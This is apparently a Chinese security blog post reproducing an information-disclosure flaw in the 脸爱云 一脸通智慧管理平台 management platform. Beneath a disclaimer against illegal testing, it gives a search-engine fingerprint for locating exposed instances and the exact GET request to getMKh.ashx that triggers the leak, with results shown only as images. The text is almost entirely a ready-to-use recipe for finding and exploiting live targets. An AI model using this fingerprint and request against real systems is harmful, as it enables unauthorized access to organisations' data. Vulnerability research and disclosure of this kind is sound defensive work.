#  【漏洞复现】脸爱云getMKh 信息泄露漏洞  
原创 devildollking
                    devildollking  熔城Sec   2026-09-23 01:00  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/nKibbsr7q5Uoic4HqaOR77KgQOr062ubgGR7k9HhTqwJWan2KibZRiczhxkEzyKMBGO4LQDicBMFMPcJgp3RI6ia8IzA/640?&random=0.11349382888065818&wxfrom=5&wx_lazy=1&wx_fmt=other&tp=webp#imgIndex=1 "")  
  
免责声明  
  
 该公众号大部分文章来自作者日常学习笔记，也有部分文章是经过作者授权和其他公众号白名单转载，未经授权，严禁转载，如需转载，联系开白。请勿利用文章内的相关技术从事非法测试，如因此产生的一切不良后果与文章作者和本公众号无关。公众号现在只对常读和星标的公众号才展示大图推送，建议把公众号设为星标，否则可能就看不到啦！感谢各位师傅。  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/nKibbsr7q5Uoic4HqaOR77KgQOr062ubgGR7k9HhTqwJWan2KibZRiczhxkEzyKMBGO4LQDicBMFMPcJgp3RI6ia8IzA/640?&random=0.11349382888065818&wxfrom=5&wx_lazy=1&wx_fmt=other&tp=webp#imgIndex=1 "")  
  
漏洞描述  
  
脸爱云-getMKh-信息泄露，导致数据信息泄露或者导致服务器被控制。  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/nKibbsr7q5Uoic4HqaOR77KgQOr062ubgGR7k9HhTqwJWan2KibZRiczhxkEzyKMBGO4LQDicBMFMPcJgp3RI6ia8IzA/640?&random=0.11349382888065818&wxfrom=5&wx_lazy=1&wx_fmt=other&tp=webp#imgIndex=1 "")  
  
资产收集  
```
title=="欢迎使用脸爱云 一脸通智慧管理平台" || body="View/UserReserved/UserReservedTest.aspx"
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/YTAMiax79d62srqPvVyYgUKWCLp7KhBwYN10Nqq2XicibLbrb6mZiaYSDSVRg14h8pR9gZAt5en76kCIJpichGTd93SiapoSaKdicexDO2c0WvBKJ8/640?wx_fmt=png&from=appmsg "")  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/nKibbsr7q5Uoic4HqaOR77KgQOr062ubgGR7k9HhTqwJWan2KibZRiczhxkEzyKMBGO4LQDicBMFMPcJgp3RI6ia8IzA/640?&random=0.11349382888065818&wxfrom=5&wx_lazy=1&wx_fmt=other&tp=webp#imgIndex=1 "")  
  
漏洞复现  
```
GET /getMKh.ashx?TyName=Inyt HTTP/1.1
Host:
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/YTAMiax79d61Cic18Jjft3HQDSnLxzKBVvw4A3tibMux42TNH0loBGqgXM5beic0RHB3pC4ZETAp2HW0ybMyicoU0rH4LtxyIlYqUGwqnxDzVPTA/640?wx_fmt=png&from=appmsg "")  
  
  
